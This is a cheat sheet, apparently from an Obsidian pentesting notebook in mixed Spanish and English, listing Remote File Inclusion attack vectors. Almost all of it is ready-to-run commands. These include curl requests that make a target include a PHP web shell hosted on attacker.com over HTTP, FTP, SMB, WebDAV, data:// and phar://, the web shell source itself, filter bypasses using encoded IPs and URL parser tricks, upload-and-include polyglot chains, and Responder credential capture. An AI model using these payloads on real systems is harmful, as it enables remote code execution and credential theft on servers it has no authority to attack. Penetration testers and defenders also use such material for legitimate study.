---
aliases:
  - RFI HTTP
  - RFI HTTPS
  - RFI FTP
  - RFI Schemes
tags:
  - type/technique
  - vuln/rfi
  - technique/execution
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[Remote File Inclusion (RFI)]]"
---
# RFI - Vectores Básicos

***

## HTTP / HTTPS Remote Inclusion

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl 'https://target/?page=http://attacker.com/shell.php&c=id'` | HTTP RFI standard RCE | Standard RFI. |
| `curl 'https://target/?page=https://attacker.com/shell.php&c=id'` | HTTPS RFI bypass HTTP IDS | TLS-aware. |
| `curl 'https://target/?page=http://attacker.com:8080/shell.php&c=id'` | Non-standard port RFI | Custom port. |
| `curl 'https://target/?page=http://attacker.com/dir/shell.php&c=id'` | Subdirectory RFI | Subdir. |
| `curl 'https://target/?page=http://attacker.com/shell.php?cmd=whoami'` | Query string passed-thru | Cmd via query. |
| `curl 'https://target/?page=http://attacker.com/shell.txt&c=id'` | `.txt` extension included as PHP | Extension flexibility. |
| `curl 'https://target/?page=http://attacker.com/payload&c=id'` | Sin extension included | App lacks extension check. |
| `curl 'https://target/?page=http://attacker.com/redirect.php'` (redirects → final payload) | Open Redirect chain RFI | Redirect chain. |
| `curl 'https://target/?page=http://attacker.com/poly.gif&c=id'` (polyglot GIF+PHP) | Polyglot magic-byte file | Polyglot. |
| `python3 -m http.server 80 --bind 0.0.0.0` (en attacker.com) then `curl https://target/?page=http://attacker.com/shell.php` | Quick HTTP server payload host | Standard host. |
| `curl -A 'PHP/8.0' 'https://target/?page=http://attacker.com/conditional.php'` | Server serves payload by User-Agent | Conditional payload. |
| `for url in 'http://attacker.com/sh.php' 'https://attacker.com/sh.php' 'http://attacker.com:8080/sh.php'; do echo "[+] $url"; curl "https://target/?page=$url&c=id"; done` | Iterate scheme variants probe | Schemes probe. |
| `curl 'https://target/?page=http://attacker.com/shell.php?'` (trailing `?` discards appended ext) | Trailing `?` to discard appended `.php` | Append-ext bypass. |
| `curl 'https://target/?page=http://attacker.com/shell.php%23'` (URL-encoded `#`) | Trailing `#` fragment ignore | Fragment bypass. |
^rfi-vector-http

### Setup atacante HTTP server

```bash
mkdir /tmp/rfi
cat > /tmp/rfi/shell.php <<'EOF'
<?php
if(isset($_GET['c'])) {
    system($_GET['c']);
}
?>
EOF

cd /tmp/rfi && python3 -m http.server 80
# Victim:
# curl 'https://target/index.php?page=http://attacker.com/shell.php&c=id'
```

___

## FTP / SMB Schemes

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl 'https://target/?page=ftp://attacker.com/shell.php&c=id'` | FTP anonymous RFI | FTP allow_url_fopen. |
| `curl 'https://target/?page=ftp://anon:x@attacker.com/shell.php&c=id'` | FTP anonymous explicit | Anon. |
| `curl 'https://target/?page=ftp://user:pass@attacker.com/shell.php&c=id'` | FTP authenticated userinfo URL | Auth. |
| `curl 'https://target/?page=\\\\attacker.com\\share\\shell.php&c=id'` | UNC SMB Windows | Windows SMB. |
| `curl 'https://target/?page=smb://attacker.com/share/shell.php&c=id'` | Linux smb:// scheme | Linux SMB. |
| `curl 'https://target/?page=cifs://attacker.com/share/shell.php&c=id'` | CIFS scheme variant | Edge. |
| `python3 -m pyftpdlib -p 21 -d /tmp/rfi --read-permit=elradfmw --write-permit=elradfmw` (anon FTP server) | Quick anon FTP server payload host | Setup. |
| `impacket-smbserver share /tmp/rfi -smb2support` (anon SMB) | Quick SMB anon share | Setup SMB. |
| `curl 'https://target/?page=sftp://attacker.com/shell.php&c=id'` (PHP ssh2 ext) | sftp:// scheme RFI | PHP ssh2 ext. |
| `curl 'https://target/?page=http://attacker.com/dav/shell.php&c=id'` (WebDAV) | WebDAV-hosted payload | WebDAV. |
| `cadaver http://attacker.com/dav/` (setup WebDAV) | Setup WebDAV server | Setup. |
| `responder -I eth0 -wrf` (capture credentials via SMB) | Responder SMB capture victim creds | Adjacent SMB. |
^rfi-vector-ftp

___

## Raw URL Inclusion

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl 'https://target/?page=http://attacker.com/raw&c=id'` | URL sin extension | App appends `.php`. |
| `curl 'https://target/?page=http://attacker.com/x?&c=id'` | Trailing `?` terminate appended | App-appended extension dropped. |
| `curl 'https://target/?page=http://attacker.com/x%23&c=id'` | URL-encoded `#` fragment ignore | Fragment bypass. |
| `curl 'https://target/?page=http%3A%2F%2Fattacker.com%2Fshell.php&c=id'` | URL-encoded scheme | URL encode. |
| `curl 'https://target/?page=http%253A%252F%252Fattacker.com%252Fshell.php&c=id'` | Double URL-encoded scheme | Multi-decode. |
| `curl 'https://target/?page=http://3232235521/shell.php&c=id'` (3232235521 = 192.168.1.1) | Decimal IP URL bypass DNS filter | Decimal IP. |
| `curl 'https://target/?page=http://0xC0A80101/shell.php&c=id'` | Hex IP URL bypass | Hex IP. |
| `curl 'https://target/?page=http://[2001:db8::1]/shell.php&c=id'` | IPv6 URL | IPv6 host. |
| `curl 'https://target/?page=http://target.com@attacker.com/shell.php&c=id'` | URL userinfo parser trick | Parser confusion. |
| `curl 'https://target/?page=http://attacker.com#@target.com/shell.php&c=id'` | Fragment user trick | URL parser quirk. |
| `curl 'https://target/?page=https://bit.ly/shorturl&c=id'` (URL shortener) | URL shortener proxy | URL filter bypass. |
| `curl 'https://target/?page=https://legit-redirect.com/r?url=http://attacker.com/shell.php&c=id'` | Open Redirect chain | Redirect chain. |
| `dig +short attacker.com` luego use IP directly | Bypass DNS-blocklist with raw IP | IP bypass. |
| `python3 -c "import socket; print(int.from_bytes(socket.inet_aton('192.168.1.1'),'big'))"` | Calculate decimal IP for bypass | Encode helper. |
^rfi-vector-raw

___

## Combine con Local Upload

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -F 'file=@shell.php' https://target/upload && curl 'https://target/?page=https://target/uploads/shell.php&c=id'` | Upload + self-host RFI loop | Self-RFI loop. |
| `echo '<?php system($_GET["c"]); ?>' > shell.txt && curl -F 'file=@shell.txt' https://target/upload && curl 'https://target/?page=https://target/uploads/shell.txt&c=id'` | `.txt` upload + RFI include as PHP | Extension bypass. |
| `exiftool -Comment='<?php system($_GET["c"]); ?>' image.jpg && curl -F 'image=@image.jpg' https://target/upload && curl 'https://target/?page=https://target/uploads/image.jpg&c=id'` | EXIF inject + RFI include | Polyglot. |
| `curl -F 'file=@shell.php' https://attacker-sub.target.com/upload` (post-takeover) | Subdomain takeover + payload host | Sub-takeover combo. |
| `python3 -c "import zipfile; z=zipfile.ZipFile('p.zip','w'); z.writestr('shell.php','<?php system(\$_GET[\"c\"]); ?>'); z.close()" && curl -F 'file=@p.zip' https://target/upload && curl 'https://target/?page=phar:///tmp/p.zip/shell.php'` | Phar polyglot upload + trigger | Phar combo. |
| `curl --data-urlencode 'page=data://text/plain;base64,'$(echo '<?php system("id"); ?>' \| base64 -w0) -G https://target/` | data:// inline payload (sin upload) | data:// alt. |
| `python3 -m http.server 80` en attacker + `curl 'https://target/?page=http://attacker.com/shell.php&c=id'` | Attacker hosts payload directly | Standard. |
| `curl -F 'file=@logo.png;filename=../../tmp/sh.png' https://target/upload && curl 'https://target/?page=/tmp/sh.png&c=id'` | Path traversal upload + LFI variant | LFI hybrid. |
| `curl -F 'file=@payload.phar' https://target/upload && curl 'https://target/?page=phar:///var/www/uploads/payload.phar/x'` | Phar deserialization trigger post-upload | Phar-deser combo. |
| `for sub in www app api admin; do curl -F 'file=@shell.php' "https://$sub.target.com/upload" 2>&1 \| head -1; done` | Multi-subdomain upload probe | Sub probe. |
| Burp Repeater intercept upload → modify filename → forward | Manual upload chain | Workflow. |
^rfi-vector-local-upload

***
